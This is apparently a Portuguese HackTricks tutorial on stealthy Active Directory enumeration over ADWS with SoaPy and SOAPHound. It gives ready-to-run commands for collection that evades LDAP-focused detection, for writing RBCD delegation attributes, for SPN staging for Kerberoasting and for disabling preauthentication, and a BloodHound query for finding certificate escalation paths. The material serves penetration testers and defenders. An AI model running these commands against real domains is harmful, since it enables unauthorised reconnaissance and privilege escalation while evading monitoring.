# Enumeração e Coleta Discreta do Active Directory Web Services (ADWS)

{{#include ../../banners/hacktricks-training.md}}

## O que é ADWS?

Active Directory Web Services (ADWS) está **habilitado por padrão em todo Domain Controller desde o Windows Server 2008 R2** e escuta em TCP **9389**. Apesar do nome, **nenhum HTTP está envolvido**. Em vez disso, o serviço expõe dados no estilo LDAP através de uma pilha de protocolos de framing proprietários .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Como o tráfego é encapsulado dentro desses frames SOAP binários e viaja por uma porta incomum, **a enumeração via ADWS tem muito menos probabilidade de ser inspecionada, filtrada ou detectada por assinaturas do que o tráfego LDAP clássico/389 & 636**. Para operadores isso significa:

* Recon mais discreto – Blue teams often concentrate on LDAP queries.
* Liberdade para coletar a partir de **non-Windows hosts (Linux, macOS)** tunelando 9389/TCP através de um SOCKS proxy.
* Os mesmos dados que você obteria via LDAP (usuários, grupos, ACLs, esquema, etc.) e a capacidade de realizar **writes** (por exemplo `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

As interações ADWS são implementadas sobre WS-Enumeration: cada consulta começa com uma mensagem `Enumerate` que define o filtro/atributos LDAP e retorna um GUID `EnumerationContext`, seguida por uma ou mais mensagens `Pull` que transmitem até a janela de resultados definida pelo servidor. Contextos expiram após ~30 minutos, então ferramentas precisam paginar os resultados ou dividir filtros (consultas por prefixo por CN) para evitar perda de estado. Ao solicitar security descriptors, especifique o controle `LDAP_SERVER_SD_FLAGS_OID` para omitir SACLs; caso contrário o ADWS simplesmente descarta o atributo `nTSecurityDescriptor` da sua resposta SOAP.

> NOTA: ADWS também é usado por muitas ferramentas RSAT GUI/PowerShell, então o tráfego pode se misturar com atividade administrativa legítima.

## SoaPy – Cliente Python nativo

[SoaPy](https://github.com/logangoins/soapy) é uma **reimplementação completa da stack de protocolo ADWS em Python puro**. Ele constrói os frames NBFX/NBFSE/NNS/NMF byte por byte, permitindo coleta a partir de sistemas Unix-like sem tocar o runtime .NET.

### Principais Características

* Suporta **proxy via SOCKS** (útil a partir de implants C2).
* Filtros de busca granulares idênticos ao LDAP `-q '(objectClass=user)'`.
* Operações opcionais de **write** (`--set` / `--delete`).
* Modo de saída **BOFHound** para ingestão direta no BloodHound.
* Flag `--parse` para embelezar timestamps / `userAccountControl` quando for necessária legibilidade humana.

### Flags de coleta direcionada & operações de escrita

O SoaPy vem com switches curados que replicam as tarefas de hunting LDAP mais comuns via ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, além dos knobs brutos `--query` / `--filter` para pulls customizados. Combine-os com primitivas de escrita como `--rbcd <source>` (define `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging para Kerberoasting direcionado) e `--asrep` (inverte `DONT_REQ_PREAUTH` em `userAccountControl`).

Exemplo de busca SPN direcionada que retorna apenas `samAccountName` e `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Use o mesmo host/credentials para imediatamente transformar as descobertas em ataque: dump RBCD-capable objects com `--rbcds`, depois aplique `--rbcd 'WEBSRV01$' --account 'FILE01$'` para montar uma Resource-Based Constrained Delegation chain (veja [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para o caminho completo de abuso).

### Instalação (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – Coleta ADWS de Alto Volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) é um coletor .NET que mantém todas as interações LDAP dentro do ADWS e gera JSON compatível com o BloodHound v4. Ele constrói um cache completo de `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` uma vez (`--buildcache`), depois o reutiliza para execuções de alto volume `--bhdump`, `--certdump` (ADCS) ou `--dnsdump` (DNS integrado ao AD), de modo que apenas ~35 atributos críticos saiam do DC. AutoSplit (`--autosplit --threshold <N>`) particiona automaticamente as consultas por prefixo CN para permanecer abaixo do timeout EnumerationContext de 30 minutos em grandes florestas.

Fluxo de trabalho típico em uma VM de operador associada ao domínio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON exportados encaixam-se diretamente nos fluxos de trabalho do SharpHound/BloodHound — veja [BloodHound methodology](bloodhound.md) para ideias de análise por grafo. AutoSplit torna o SOAPHound resiliente em florestas com milhões de objetos, mantendo a contagem de consultas menor do que snapshots no estilo ADExplorer.

## Fluxo discreto de coleta do AD

O fluxo abaixo mostra como enumerar **domain & ADCS objects** via ADWS, convertê-los para BloodHound JSON e buscar caminhos de ataque baseados em certificados — tudo a partir do Linux:

1. **Tunnel 9389/TCP** da rede alvo para sua máquina (por exemplo via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exporte `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou use os parâmetros do SoaPy `--proxyHost/--proxyPort`.

2. **Coletar o objeto do domínio raiz:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Coletar objetos relacionados ao ADCS da Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converter para BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Upload the ZIP** na BloodHound GUI e execute consultas cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar caminhos de escalonamento de certificados (ESC1, ESC8, etc.).

### Escrevendo `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine isso com `s4u2proxy`/`Rubeus /getticket` para uma cadeia completa de **Resource-Based Constrained Delegation** (veja [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Resumo de Ferramentas

| Propósito | Ferramenta | Observações |
|---------|------|-------|
| Enumeração ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, leitura/escrita |
| Dump de alto volume do ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modos BH/ADCS/DNS |
| Ingestão para BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte logs do SoaPy/ldapsearch |
| Comprometimento de certificado | [Certipy](https://github.com/ly4k/Certipy) | Pode ser encaminhado através do mesmo SOCKS |

## Referências

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
